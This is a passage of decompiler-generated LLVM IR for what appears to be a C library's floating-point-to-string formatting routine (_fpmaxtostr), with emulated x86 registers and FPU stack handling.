  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f5d1, { 1, 0 }
  uselistorder label %dec_label_pc_804f5be, { 1, 0 }
  uselistorder label %dec_label_pc_804f5af, { 1, 0 }
  uselistorder label %dec_label_pc_804f56a, { 1, 0 }
  uselistorder label %dec_label_pc_804f546, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_5()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f5dd = load i32, i32* @edi, align 4
  %v0_804f5de = load i32, i32* @esi, align 4
  %v0_804f5df = load i32, i32* @ebx, align 4
  store i32 %v0_804f5df, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_804f5f4 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_804f5f4 = add i3 %v4_804f5f4, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_804f5f4, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804f5fb = add i32 %tmp156, 4
  %v2_804f5fb = inttoptr i32 %v1_804f5fb to i32*
  %v3_804f5fb = load i32, i32* %v2_804f5fb, align 4
  store i32 %v3_804f5fb, i32* %eax.global-to-local, align 4
  %v1_804f602 = add i32 %tmp156, 8
  %v2_804f602 = inttoptr i32 %v1_804f602 to i8*
  %v3_804f602 = load i8, i8* %v2_804f602, align 1
  %v4_804f602 = zext i8 %v3_804f602 to i32
  %v6_804f602 = and i32 %v0_804f5df, -256
  %v7_804f602 = or i32 %v4_804f602, %v6_804f602
  store i32 %v7_804f602, i32* %ebx.global-to-local, align 4
  %v1_804f605 = inttoptr i32 %tmp156 to i32*
  %v2_804f605 = load i32, i32* %v1_804f605, align 4
  store i32 %v2_804f605, i32* %ebp.global-to-local, align 4
  %v2_804f611 = or i8 %v3_804f602, 32
  %v7_804f611 = zext i8 %v2_804f611 to i32
  %v9_804f611 = and i32 %v3_804f5fb, -256
  %v10_804f611 = or i32 %v7_804f611, %v9_804f611
  store i32 %v10_804f611, i32* %eax.global-to-local, align 4
  %v10_804f613 = icmp eq i8 %v2_804f611, 97
  %v1_804f619 = icmp eq i1 %v10_804f613, false
  br i1 %v1_804f619, label %dec_label_pc_804f622, label %dec_label_pc_804f61b

dec_label_pc_804f61b:                             ; preds = %entry
  %v2_804f61b = add i8 %v3_804f602, 6
  %v15_804f61b = zext i8 %v2_804f61b to i32
  %v18_804f61b = or i32 %v15_804f61b, %v6_804f602
  store i32 %v18_804f61b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f622

dec_label_pc_804f622:                             ; preds = %entry, %dec_label_pc_804f61b
  %stack_var_-207.0 = phi i8 [ %v3_804f602, %entry ], [ %v2_804f61b, %dec_label_pc_804f61b ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_804f629 = icmp slt i32 %v2_804f605, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_804f638 = select i1 %v2_804f629, i32 6, i32 %v2_804f605
  store i32 %v3_804f638, i32* %ebp.global-to-local, align 4
  %v1_804f63b = add i32 %tmp156, 12
  %v2_804f63b = inttoptr i32 %v1_804f63b to i32*
  %v3_804f63b = load i32, i32* %v2_804f63b, align 4
  store i32 %v3_804f63b, i32* %eax.global-to-local, align 4
  %v2_804f63e = and i32 %v3_804f63b, 2
  %v3_804f63e = icmp eq i32 %v2_804f63e, 0
  br i1 %v3_804f63e, label %dec_label_pc_804f64c, label %dec_label_pc_804f658

dec_label_pc_804f64c:                             ; preds = %dec_label_pc_804f622
  %v2_804f64c = urem i32 %v3_804f63b, 2
  %tmp192 = trunc i32 %v2_804f64c to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_804f658

dec_label_pc_804f658:                             ; preds = %dec_label_pc_804f64c, %dec_label_pc_804f622
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_804f622 ], [ %tmp193, %dec_label_pc_804f64c ]
  %not.v5_804f658 = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_804f658, label %dec_label_pc_804f6cf, label %dec_label_pc_804f67a

dec_label_pc_804f67a:                             ; preds = %dec_label_pc_804f658
  %v1_804f67a = add i3 %v4_804f5f4, -2
  store i3 %v1_804f67a, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_804f67e = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_804f67e, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_804f67a
  br label %dec_label_pc_804f70a

bb180:                                            ; preds = %dec_label_pc_804f67a
  %v5_804f67e = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_804f67e, label %bb181, label %dec_label_pc_804f682

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_804f70a

dec_label_pc_804f682:                             ; preds = %bb180
  %not.v4_804f67c = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_804f67c, label %dec_label_pc_804f70a, label %dec_label_pc_804f79f

dec_label_pc_804f6cf:                             ; preds = %dec_label_pc_804f658
  store i3 %v4_804f5f4, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_804f6d6 = add i32 %tmp156, 16
  %v2_804f6d6 = inttoptr i32 %v1_804f6d6 to i32*
  store i32 32, i32* %v2_804f6d6, align 4
  %v4_804f6dd = add i8 %stack_var_-207.0, -96
  %v6_804f6dd = sub i8 95, %stack_var_-207.0
  %v7_804f6dd = and i8 %v6_804f6dd, %stack_var_-207.0
  %v8_804f6dd = icmp slt i8 %v7_804f6dd, 0
  %v9_804f6dd = icmp eq i8 %v4_804f6dd, 0
  %v10_804f6dd = icmp slt i8 %v4_804f6dd, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_804f6f2 = icmp eq i1 %v10_804f6dd, %v8_804f6dd
  %v4_804f6f2 = icmp eq i1 %v9_804f6dd, false
  %v5_804f6f2 = and i1 %v4_804f6f2, %v3_804f6f2
  br i1 %v5_804f6f2, label %dec_label_pc_804f6f9, label %dec_label_pc_804f6f4

dec_label_pc_804f6f4:                             ; preds = %dec_label_pc_804f6cf
  br label %dec_label_pc_804f6f9

dec_label_pc_804f6f9:                             ; preds = %dec_label_pc_804f6cf, %dec_label_pc_804f6f4
  %v2_804f701 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804f701, i32* @ecx, align 4
  br label %dec_label_pc_804faca

dec_label_pc_804f70a:                             ; preds = %dec_label_pc_804f682, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_804f724 = xor i3 %v4_804f5f4, -4
  store i3 %v3_804f724, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_804f72a

dec_label_pc_804f72a:                             ; preds = %dec_label_pc_804f77b, %dec_label_pc_804f70a
  %v0_804f77b = phi i32 [ 4096, %dec_label_pc_804f70a ], [ %v2_804f77b, %dec_label_pc_804f77b ]
  %v2_804f72d = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_804f70a ], [ %v2_804f72d81, %dec_label_pc_804f77b ]
  %v1_804f765 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_804f70a ], [ %v0_804f72a79, %dec_label_pc_804f77b ]
  %v0_804f77766 = phi i32 [ 13, %dec_label_pc_804f70a ], [ %v1_804f72c, %dec_label_pc_804f77b ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_804f70a ], [ %stack_var_-220.1, %dec_label_pc_804f77b ]
  %v1_804f72c = add i32 %v0_804f77766, -1
  %v4_804f72d = fcmp ule x86_fp80 %v1_804f765, %v2_804f72d
  br i1 %v4_804f72d, label %dec_label_pc_804f754, label %dec_label_pc_804f731

dec_label_pc_804f731:                             ; preds = %dec_label_pc_804f72a
  store x86_fp80 %v1_804f765, x86_fp80* %st0.global-to-local, align 4
  %v3_804f733 = mul i32 %v1_804f72c, 12
  store i32 %v3_804f733, i32* %eax.global-to-local, align 4
  %v1_804f736 = add i32 %v3_804f733, ptrtoint (x86_fp80** @global_var_8051800.130 to i32)
  %v2_804f736 = inttoptr i32 %v1_804f736 to x86_fp80*
  %v3_804f736 = load x86_fp80, x86_fp80* %v2_804f736, align 4
  %v4_804f73c = fmul x86_fp80 %v1_804f765, %v3_804f736
  store x86_fp80 %v4_804f73c, x86_fp80* %st1.global-to-local, align 4
  %v4_804f740 = fcmp ule x86_fp80 %v4_804f73c, %v3_804f736
  br i1 %v4_804f740, label %dec_label_pc_804f775, label %dec_label_pc_804f744

dec_label_pc_804f744:                             ; preds = %dec_label_pc_804f731
  store x86_fp80 %v4_804f73c, x86_fp80* %st1.global-to-local, align 4
  %v5_804f74e = sub i32 %stack_var_-220.0, %v0_804f77b
  br label %dec_label_pc_804f777

dec_label_pc_804f754:                             ; preds = %dec_label_pc_804f72a
  %v3_804f754 = mul i32 %v1_804f72c, 12
  store i32 %v3_804f754, i32* %eax.global-to-local, align 4
  %v1_804f757 = add i32 %v3_804f754, ptrtoint (x86_fp80** @global_var_8051800.130 to i32)
  %v2_804f757 = inttoptr i32 %v1_804f757 to x86_fp80*
  %v3_804f757 = load x86_fp80, x86_fp80* %v2_804f757, align 4
  %v4_804f75d = fdiv x86_fp80 %v3_804f757, %v1_804f765
  store x86_fp80 %v4_804f75d, x86_fp80* %st1.global-to-local, align 4
  %v4_804f75f = fcmp ogt x86_fp80 %v3_804f757, %v1_804f765
  br i1 %v4_804f75f, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_804f754
  store x86_fp80 %v3_804f757, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_804f765

bb183:                                            ; preds = %dec_label_pc_804f754
  %v5_804f75f = fcmp olt x86_fp80 %v3_804f757, %v1_804f765
  br i1 %v5_804f75f, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_804f757, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_804f775

bb184:                                            ; preds = %bb183
  %not.v6_804f75f = fcmp une x86_fp80 %v3_804f757, %v1_804f765
  store x86_fp80 %v3_804f757, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_804f75f, label %dec_label_pc_804f775, label %dec_label_pc_804f765

dec_label_pc_804f765:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_804f757, x86_fp80* %st1.global-to-local, align 4
  %v5_804f76f = add i32 %stack_var_-220.0, %v0_804f77b
  br label %dec_label_pc_804f777

dec_label_pc_804f775:                             ; preds = %dec_label_pc_804f731, %.thread51, %bb184
  %v1_804f775 = phi x86_fp80 [ %v1_804f765, %.thread51 ], [ %v1_804f765, %bb184 ], [ %v3_804f736, %dec_label_pc_804f731 ]
  %v0_804f72a80 = phi x86_fp80 [ %v3_804f757, %.thread51 ], [ %v3_804f757, %bb184 ], [ %v4_804f73c, %dec_label_pc_804f731 ]
  store x86_fp80 %v1_804f775, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804f777

dec_label_pc_804f777:                             ; preds = %dec_label_pc_804f765, %dec_label_pc_804f744, %dec_label_pc_804f775
  %v2_804f72d81 = phi x86_fp80 [ %v1_804f775, %dec_label_pc_804f775 ], [ %v2_804f72d, %dec_label_pc_804f765 ], [ %v1_804f765, %dec_label_pc_804f744 ]
  %v0_804f72a79 = phi x86_fp80 [ %v0_804f72a80, %dec_label_pc_804f775 ], [ %v3_804f757, %dec_label_pc_804f765 ], [ %v4_804f73c, %dec_label_pc_804f744 ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_804f775 ], [ %v5_804f76f, %dec_label_pc_804f765 ], [ %v5_804f74e, %dec_label_pc_804f744 ]
  %v1_804f777 = icmp eq i32 %v1_804f72c, 0
  br i1 %v1_804f777, label %.thread60, label %dec_label_pc_804f77b

dec_label_pc_804f77b:                             ; preds = %dec_label_pc_804f777
  %v2_804f77b = sdiv i32 %v0_804f77b, 2
  store i32 %v2_804f77b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f72a

.thread60:                                        ; preds = %dec_label_pc_804f777
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_804f79f

dec_label_pc_804f79f:                             ; preds = %dec_label_pc_804f682, %.thread60
  %v0_804f859 = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_804f682 ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_804f682 ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_804f7a3 = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_804f67a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_804f7b6 = and i32 %v2_804f7a3, -65536
  %v1_804f7bb = udiv i16 %tmp146, 256
  %v2_804f7bb = zext i16 %v1_804f7bb to i32
  %v3_804f7bb = or i32 %v2_804f7bb, 12
  %v10_804f7bb = mul nuw nsw i32 %v3_804f7bb, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_804f7b6.masked = zext i16 %tmp194 to i32
  %v11_804f7bb = or i32 %v10_804f7bb, %v4_804f7b6.masked
  %v12_804f7bb = or i32 %v11_804f7bb, %v6_804f7b6
  store i32 %v12_804f7bb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f7c3

dec_label_pc_804f7c3:                             ; preds = %dec_label_pc_804f815.dec_label_pc_804f7c3_crit_edge, %dec_label_pc_804f79f
  %v2_804f7e8 = phi x86_fp80 [ %storemerge, %dec_label_pc_804f79f ], [ %v2_804f7e8.pre, %dec_label_pc_804f815.dec_label_pc_804f7c3_crit_edge ]
  %v1_804f7c3 = phi i3 [ %v1_804f67a, %dec_label_pc_804f79f ], [ %v1_804f7c3.pre, %dec_label_pc_804f815.dec_label_pc_804f7c3_crit_edge ]
  %v3_804f7ea = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_804f79f ], [ %v0_804f7c3.pre, %dec_label_pc_804f815.dec_label_pc_804f7c3_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_804f7a3, %dec_label_pc_804f79f ], [ %v4_804f7e3, %dec_label_pc_804f815.dec_label_pc_804f7c3_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_804f7ea to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_804f7dd = sitofp i32 %tmp195 to x86_fp80
  %v4_804f7e3 = add i32 %stack_var_-212.0, 9
  %v4_804f7e8 = fsub x86_fp80 %v2_804f7e8, %v5_804f7dd
  store i3 %v1_804f7c3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804f7ea = fmul x86_fp80 %v3_804f7ea, %v4_804f7e8
  store x86_fp80 %v4_804f7ea, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804f7ec

dec_label_pc_804f7ec:                             ; preds = %dec_label_pc_804f7ec.dec_label_pc_804f7ec_crit_edge, %dec_label_pc_804f7c3
  %v0_804f800 = phi i32 [ %v0_804f800.pre, %dec_label_pc_804f7ec.dec_label_pc_804f7ec_crit_edge ], [ %tmp195, %dec_label_pc_804f7c3 ]
  %v0_804f7f0 = phi i32 [ %v0_804f7f0.pre, %dec_label_pc_804f7ec.dec_label_pc_804f7ec_crit_edge ], [ 0, %dec_label_pc_804f7c3 ]
  %v1_804f7f0 = add i32 %v0_804f7f0, 1
  store i32 %v1_804f7f0, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_804f7fa = sub i32 %v4_804f7e3, %v1_804f7f0
  %div = udiv i32 %v0_804f800, 10
  %tmp185 = urem i32 %v0_804f800, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_804f806 = and i32 %div, 536870656
  store i32 %v2_804f7fa, i32* %edx.global-to-local, align 4
  %v1_804f80c = trunc i32 %tmp185 to i8
  %v2_804f80c = or i8 %v1_804f80c, 48
  %v12_804f80c = zext i8 %v2_804f80c to i32
  %v15_804f80c = or i32 %v12_804f80c, %v3_804f806
  store i32 %v15_804f80c, i32* %eax.global-to-local, align 4
  %v3_804f811 = inttoptr i32 %v2_804f7fa to i8*
  store i8 %v2_804f80c, i8* %v3_804f811, align 1
  %v7_804f813 = icmp sgt i32 %v1_804f7f0, 8
  br i1 %v7_804f813, label %dec_label_pc_804f815, label %dec_label_pc_804f7ec.dec_label_pc_804f7ec_crit_edge

dec_label_pc_804f7ec.dec_label_pc_804f7ec_crit_edge: ; preds = %dec_label_pc_804f7ec
  %v0_804f7f0.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_804f800.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f7ec

dec_label_pc_804f815:                             ; preds = %dec_label_pc_804f7ec
  %v0_804f815 = load i32, i32* @edi, align 4
  %v1_804f815 = add i32 %v0_804f815, 1
  store i32 %v1_804f815, i32* @edi, align 4
  %v7_804f819 = icmp sgt i32 %v1_804f815, 2
  br i1 %v7_804f819, label %dec_label_pc_804f81b, label %dec_label_pc_804f815.dec_label_pc_804f7c3_crit_edge

dec_label_pc_804f815.dec_label_pc_804f7c3_crit_edge: ; preds = %dec_label_pc_804f815
  %v0_804f7c3.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_804f7c3.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_804f7e8.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804f7c3

dec_label_pc_804f81b:                             ; preds = %dec_label_pc_804f815
  %v0_804f81b = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804f81b = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_804f81b, x86_fp80* %st0.global-to-local, align 4
  %v2_804f81d = add i3 %v0_804f81b, 2
  store i3 %v2_804f81d, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804f81f = add i8 %stack_var_-207.0, -96
  %v6_804f81f = sub i8 95, %stack_var_-207.0
  %v7_804f81f = and i8 %v6_804f81f, %stack_var_-207.0
  %v8_804f81f = icmp slt i8 %v7_804f81f, 0
  %v9_804f81f = icmp eq i8 %v4_804f81f, 0
  %v10_804f81f = icmp slt i8 %v4_804f81f, 0
  %v3_804f824 = icmp eq i1 %v10_804f81f, %v8_804f81f
  %v4_804f824 = icmp eq i1 %v9_804f81f, false
  %v5_804f824 = and i1 %v4_804f824, %v3_804f824
  br i1 %v5_804f824, label %dec_label_pc_804f833, label %dec_label_pc_804f826

dec_label_pc_804f826:                             ; preds = %dec_label_pc_804f81b
  %v4_804f826 = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_804f833

dec_label_pc_804f833:                             ; preds = %dec_label_pc_804f81b, %dec_label_pc_804f826
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_804f81b ], [ %v4_804f826, %dec_label_pc_804f826 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_804f81b ], [ 69, %dec_label_pc_804f826 ]
  %v12_804f833 = icmp eq i8 %stack_var_-207.1, 103
  %v1_804f838 = icmp eq i1 %v12_804f833, false
  br i1 %v1_804f838, label %dec_label_pc_804f841, label %dec_label_pc_804f83a

dec_label_pc_804f83a:                             ; preds = %dec_label_pc_804f833
  %v0_804f83a = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_804f83a, 1
  br i1 %tmp186, label %dec_label_pc_804f848, label %dec_label_pc_804f83e

dec_label_pc_804f83e:                             ; preds = %dec_label_pc_804f83a
  %v1_804f83e = add i32 %v0_804f83a, -1
  store i32 %v1_804f83e, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f848

dec_label_pc_804f841:                             ; preds = %dec_label_pc_804f833
  %v12_804f841 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_804f841, label %dec_label_pc_804f84c, label %dec_label_pc_804f841.dec_label_pc_804f848_crit_edge

dec_label_pc_804f841.dec_label_pc_804f848_crit_edge: ; preds = %dec_label_pc_804f841
  %v0_804f848.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f848

dec_label_pc_804f848:                             ; preds = %dec_label_pc_804f841.dec_label_pc_804f848_crit_edge, %dec_label_pc_804f83a, %dec_label_pc_804f83e
  %v0_804f848 = phi i32 [ %v0_804f848.pre, %dec_label_pc_804f841.dec_label_pc_804f848_crit_edge ], [ %v0_804f83a, %dec_label_pc_804f83a ], [ %v1_804f83e, %dec_label_pc_804f83e ]
  store i32 %v0_804f848, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f879

dec_label_pc_804f84c:                             ; preds = %dec_label_pc_804f841
  store i32 %v0_804f859, i32* %eax.global-to-local, align 4
  %v0_804f850 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f850 = add i32 %v0_804f850, %v0_804f859
  store i32 %v2_804f850, i32* %ebx.global-to-local, align 4
  %v5_804f857 = icmp slt i32 %v2_804f850, -1
  br i1 %v5_804f857, label %dec_label_pc_804f859, label %dec_label_pc_804f879

dec_label_pc_804f859:                             ; preds = %dec_label_pc_804f84c
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804f861 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804f861, i32* %eax.global-to-local, align 4
  %v4_804f869 = bitcast i32* %stack_var_-72 to i8*
  %v5_804f869 = call i32 @__GI_memset(i8* %v4_804f869, i32 48, i32 21)
  store i32 %v5_804f869, i32* %eax.global-to-local, align 4
  %v0_804f879.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f879

dec_label_pc_804f879:                             ; preds = %dec_label_pc_804f84c, %dec_label_pc_804f859, %dec_label_pc_804f848
  %v1_804f899 = phi i32 [ %v0_804f848, %dec_label_pc_804f848 ], [ %v2_804f850, %dec_label_pc_804f84c ], [ %v0_804f879.pr.pre, %dec_label_pc_804f859 ]
  %stack_var_-220.3 = phi i32 [ %v0_804f859, %dec_label_pc_804f848 ], [ %v0_804f859, %dec_label_pc_804f84c ], [ -1, %dec_label_pc_804f859 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_804f88c = icmp sgt i32 %v1_804f899, 20
  br i1 %v7_804f88c, label %dec_label_pc_804f88e, label %dec_label_pc_804f899

dec_label_pc_804f88e:                             ; preds = %dec_label_pc_804f879
  %v2_804f88e = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_804f88e, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f8ad.preheader

dec_label_pc_804f899:                             ; preds = %dec_label_pc_804f879
  %v0_804f899 = load i32, i32* @esp, align 4
  %v2_804f899 = add i32 %v1_804f899, 165
  %v3_804f899 = add i32 %v2_804f899, %v0_804f899
  store i32 %v3_804f899, i32* %eax.global-to-local, align 4
  %v1_804f8a0 = add i32 %v3_804f899, 2
  %v2_804f8a0 = inttoptr i32 %v1_804f8a0 to i8*
  %v3_804f8a0 = load i8, i8* %v2_804f8a0, align 1
  %v4_804f8a0 = add i8 %v3_804f8a0, -53
  %v9_804f8a0 = sub i8 52, %v3_804f8a0
  %v10_804f8a0 = and i8 %v9_804f8a0, %v3_804f8a0
  %v11_804f8a0 = icmp slt i8 %v10_804f8a0, 0
  %v13_804f8a0 = icmp slt i8 %v4_804f8a0, 0
  store i32 %v1_804f8a0, i32* %ecx.global-to-local, align 4
  %v2_804f8a7 = icmp eq i1 %v13_804f8a0, %v11_804f8a0
  %v3_804f8a7 = zext i1 %v2_804f8a7 to i32
  br label %dec_label_pc_804f8ad.preheader

dec_label_pc_804f8ad.preheader:                   ; preds = %dec_label_pc_804f899, %dec_label_pc_804f88e
  %v0_804f8ad102 = phi i32 [ %v1_804f8a0, %dec_label_pc_804f899 ], [ %v2_804f88e, %dec_label_pc_804f88e ]
  %storemerge71 = phi i32 [ %v3_804f8a7, %dec_label_pc_804f899 ], [ 0, %dec_label_pc_804f88e ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f8ad

dec_label_pc_804f8ad:                             ; preds = %dec_label_pc_804f8ad.backedge, %dec_label_pc_804f8ad.preheader
  %v3_804f8ae = phi i32 [ %v3_804f8ae.pre, %dec_label_pc_804f8ad.backedge ], [ %storemerge71, %dec_label_pc_804f8ad.preheader ]
  %v0_804f8ad = phi i32 [ %v0_804f8b0, %dec_label_pc_804f8ad.backedge ], [ %v0_804f8ad102, %dec_label_pc_804f8ad.preheader ]
  %v1_804f8ad = add i32 %v0_804f8ad, -1
  store i32 %v1_804f8ad, i32* %ecx.global-to-local, align 4
  %v1_804f8ae = inttoptr i32 %v1_804f8ad to i8*
  %v2_804f8ae = load i8, i8* %v1_804f8ae, align 1
  %v4_804f8ae = trunc i32 %v3_804f8ae to i8
  %v5_804f8ae = add i8 %v2_804f8ae, %v4_804f8ae
  store i8 %v5_804f8ae, i8* %v1_804f8ae, align 1
  %v0_804f8b0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f8b0 = inttoptr i32 %v0_804f8b0 to i8*
  %v2_804f8b0 = load i8, i8* %v1_804f8b0, align 1
  %v3_804f8b0 = zext i8 %v2_804f8b0 to i32
  %v4_804f8b0 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f8b0 = and i32 %v4_804f8b0, -256
  %v6_804f8b0 = or i32 %v5_804f8b0, %v3_804f8b0
  store i32 %v6_804f8b0, i32* %edx.global-to-local, align 4
  %v7_804f8b2 = icmp eq i8 %v2_804f8b0, 48
  br i1 %v7_804f8b2, label %dec_label_pc_804f8ad.backedge, label %dec_label_pc_804f8b7

dec_label_pc_804f8ad.backedge:                    ; preds = %dec_label_pc_804f8ad, %dec_label_pc_804f8b7
  %v3_804f8ae.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f8ad

dec_label_pc_804f8b7:                             ; preds = %dec_label_pc_804f8ad
  %v2_804f8b7 = add i8 %v2_804f8b0, -57
  %v7_804f8b7 = sub i8 56, %v2_804f8b0
  %v8_804f8b7 = and i8 %v7_804f8b7, %v2_804f8b0
  %v9_804f8b7 = icmp slt i8 %v8_804f8b7, 0
  %v10_804f8b7 = icmp eq i8 %v2_804f8b7, 0
  %v11_804f8b7 = icmp slt i8 %v2_804f8b7, 0
  %v3_804f8ba = icmp eq i1 %v11_804f8b7, %v9_804f8b7
  %v4_804f8ba = icmp eq i1 %v10_804f8b7, false
  %v5_804f8ba = and i1 %v4_804f8ba, %v3_804f8ba
  br i1 %v5_804f8ba, label %dec_label_pc_804f8ad.backedge, label %dec_label_pc_804f8bc

dec_label_pc_804f8bc:                             ; preds = %dec_label_pc_804f8b7
  %v2_804f8bc = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_804f8bc, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_804f8b0, %v2_804f8bc
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_804f8c7, label %dec_label_pc_804f8d4

dec_label_pc_804f8c7:                             ; preds = %dec_label_pc_804f8bc
  store i32 %v2_804f7a3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f8dd

dec_label_pc_804f8d4:                             ; preds = %dec_label_pc_804f8bc
  store i32 %v2_804f8bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804f8bc, i32* %ecx.global-to-local, align 4
  %v1_804f8dc = add i32 %stack_var_-220.3, 1
  store i32 %v1_804f8dc, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f8dd

